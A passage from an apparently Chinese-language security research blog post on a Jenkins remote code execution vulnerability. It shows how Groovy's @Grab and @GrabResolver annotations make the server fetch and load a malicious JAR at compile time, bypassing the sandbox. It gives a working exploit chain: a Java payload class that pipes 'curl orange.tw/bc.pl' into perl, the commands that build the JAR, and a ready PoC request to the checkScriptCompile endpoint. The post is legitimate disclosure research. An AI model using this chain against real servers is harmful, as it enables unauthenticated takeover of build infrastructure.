    ''');
    $ ls
    poc.groovy
    $ groovy poc.groovy
    $ ls
    poc.groovy  pwned
干，可以欸! 但代志并不是憨人想的那么简单! 尝试在远端 Jenkins 重现时，出现了:
> unable to resolve class org.jenkinsci.plugins.workflow.libs.Library
真是黑人问号，森77，这到底是三小啦!!!
认真追了一下 root cause 才发现是 [Pipeline Shared Groovy Libraries
Plugin](https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin)
这个插件在作怪! 为了方便使用者可重复使用在编写 Pipeline 常用到的功能，Jenkins 提供了这个插件可在 Pipeline
中引入自定义的函式库! Jenkins 会在所有 Pipeline 执行前引入这个函式库，而在编译时期的 classPath
中并没有相对应的函式库因而导致了这个错误!
想解决这个问题很简单，到 [Jenkins Plugin Manager](http://jenkins.local/pluginManager/) 中将
[Pipeline Shared Groovy Libraries
Plugin](https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin)
移除即可解决这个问题并执行任意代码!
不过这绝对不是最佳解! 这个插件会随著 Pipeline 被自动安装，为了要成功利用这个漏洞还得先要求管理员把它移除实在太蠢了!
因此这条路只能先打住，继续寻找下一个方法!
#### 再次尝试
继续阅读 [Groovy Meta-Programming 手册](http://groovy-lang.org/metaprogramming.html)，我们发现了另一个有趣的注解 `@Grab`，关于 `@Grab`
手册中并没有详细的描述，但使用 Google 我们发现了另一篇文章 - [Dependency management with
Grape](http://docs.groovy-lang.org/latest/html/documentation/grape.html)!
原来 Grape(`@Grab`) 是一个 Groovy 内建的动态 JAR 相依性管理程式! 可让开发者动态的引入不在 classPath 上的函式库!
Grape 的语法如下:
    @Grab(group='org.springframework', module='spring-orm', version='3.2.5.RELEASE')
    import org.springframework.jdbc.core.JdbcTemplate
配合 `@grab` 的注解，可让 Groovy 在编译时期自动引入不存在于 classPath 中的 JAR 档! 但如果你的目的只是要在一个有执行
Pipeline 权限的帐号上绕过原有 Pipeline 的 Sandbox 的话，这其实就足够了! 例如你可以参考
[@adamyordan](https://github.com/adamyordan) 所提供的
[PoC](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc)，在已知使用者帐号与密码及权限足够的情况下，达到远端代码执行的效果!
但在没有帐号密码及 `execute()` 的方法下，这只是一个简单的语法树解析器，你甚至无法控制远端伺服器上的档案，所以该怎么办呢?
我们继续研究下去，并发现了一个很有趣的注解叫做 `@GrabResolver`，用法如下:
    @GrabResolver(name='restlet', root='http://maven.restlet.org/')
    @Grab(group='org.restlet', module='org.restlet', version='1.1.6')
    import org.restlet
看到这个，聪明的你应该会很想把 `root` 改成恶意网址对吧! 我们来试试会怎么样吧!
    this.class.classLoader.parseClass('''
    @GrabResolver(name='restlet', root='http://orange.tw/')
    @Grab(group='org.restlet', module='org.restlet', version='1.1.6')
    import org.restlet
    ''')
    11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] "HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1" 404 185 "-" "Apache Ivy/2.4.0"
喔干，真的会来存取欸! 到这里我们已经确信了透过 Grape 可以让 Jenkins 引入恶意的函式库! 但下一个问题是，要如何执行代码呢?
### 如何执行任意代码?
在漏洞的利用中总是在研究如何从简单的任意读、任意写到取得系统执行的权限! 从前面的例子中，我们已经可以透过 Grape 去写入恶意的 JAR
档到远端伺服器，但要怎么执行这个 JAR 档呢? 这又是另一个问题!
跟进 Groovy 语言核心查看对于 [Grape 的实作](https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java)，我们知道网路层的抓取是透过
[groovy.grape.GrapeIvy](https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy) 这个类别来完成!
所以开始寻找实作中是否有任何可以执行代码的机会! 其中，我们看到了一个有趣的方法 -[processOtherServices(…)](https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312):
    void processOtherServices(ClassLoader loader, File f) {
        try {
            ZipFile zf = new ZipFile(f)
            ZipEntry serializedCategoryMethods = zf.getEntry("META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods")
            if (serializedCategoryMethods != null) {
                processSerializedCategoryMethods(zf.getInputStream(serializedCategoryMethods))
            }
            ZipEntry pluginRunners = zf.getEntry("META-INF/services/org.codehaus.groovy.plugins.Runners")
            if (pluginRunners != null) {
                processRunners(zf.getInputStream(pluginRunners), f.getName(), loader)
            }
        } catch(ZipException ignore) {
            // ignore files we can't process, e.g. non-jar/zip artifacts
            // TODO log a warning
        }
    }
由于 JAR 档案其实就是一个 ZIP 压缩格式的子集，Grape 会检查档案中是否存在一些指定的入口点，其中一个 `Runner`
的入口点检查引起了我们的兴趣，持续跟进 [processRunners(…)](https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335) 的实作我们发现:
    void processRunners(InputStream is, String name, ClassLoader loader) {
        is.text.readLines().each {
            GroovySystem.RUNNER_REGISTRY[name] = loader.loadClass(it.trim()).newInstance()
        }
    }
这里的 `newInstance()` 不就代表著可以呼叫到任意类别的 `Constructor` 吗? 没错! 所以只需产生一个恶意的 JAR
档，把要执行的类别全名放至 `META-INF/services/org.codehaus.groovy.plugins.Runners`
中即可呼叫指定类别的`Constructor`去执行任意代码! 完整的漏洞利用过程如下:
    public class Orange {
        public Orange(){
            try {
                String payload = "curl orange.tw/bc.pl | perl -";
                String[] cmds = {"/bin/bash", "-c", payload};
                java.lang.Runtime.getRuntime().exec(cmds);
            } catch (Exception e) { }
        }
    }
    $ javac Orange.java
    $ mkdir -p META-INF/services/
    $ echo Orange > META-INF/services/org.codehaus.groovy.plugins.Runners
    $ find .
    ./Orange.java
    ./Orange.class
    ./META-INF
    ./META-INF/services
    ./META-INF/services/org.codehaus.groovy.plugins.Runners
    $ jar cvf poc-1.jar ./Orange.class /META-INF/
    $ cp poc-1.jar ~/www/tw/orange/poc/1/
    $ curl -I http://[your_host]/tw/orange/poc/1/poc-1.jar
    HTTP/1.1 200 OK
    Date: Sat, 02 Feb 2019 11:10:55 GMT
    ...
PoC:
    http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
    ?value=
    @GrabConfig(disableChecksums=true)%0a
    @GrabResolver(name='orange.tw', root='http://[your_host]/')%0a
    @Grab(group='tw.orange', module='poc', version='1')%0a
    import Orange;
影片:
### 后记
到此，我们已经可以完整的控制远端伺服器! 透过 Meta-Programming 在语法树解析时期去引入恶意的 JAR 档，再透过 Java 的
Static Initializer 特性去执行任意指令! 虽然 Jenkins 有内建的 Groovy Sandbox([Script Security
Plugin](https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin))，但这个漏洞是在编译阶段而非执行阶段，导致
Sandbox 毫无用武之处!
由于这是对于 Groovy 底层的一种攻击方式，因此只要是所有可以碰触到 Groovy 解析的地方皆有可能有漏洞产生!
而这也是这个漏洞好玩的地方，打破了一般开发者认为没有执行就不会有问题的思维，对攻击者来说也用了一个没有电脑科学的理论知识背景不会知道的方法攻击!
不然你根本不会想到 Meta-Programming! 除了我回报的 `doCheckScriptCompile(...)` 与 `toJson(...)`
两个进入点外，在漏洞被修复后，[Mikhail Egorov](https://twitter.com/0ang3el)
也很快的找到了另外一个[进入点](https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292)去触发这个漏洞!
除此之外，这个漏洞更可以与我前一篇 [Hacking Jenkins Part
1](https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/) 所发现的漏洞串起来，去绕过 Overall/Read
的限制成为一个名符其实不用认证的远端代码执行漏洞!(如果你有好好的读完这两篇文章，应该对你不是难事XD) 至于有没有更多的玩法?
就交给大家自由发挥串出自己的攻击链啰!
感谢大家的阅读，Hacking Jenkins 系列文就在这里差不多先告一个段落啰! 未来将会再发表更多有趣的技术研究敬请期待!
* * *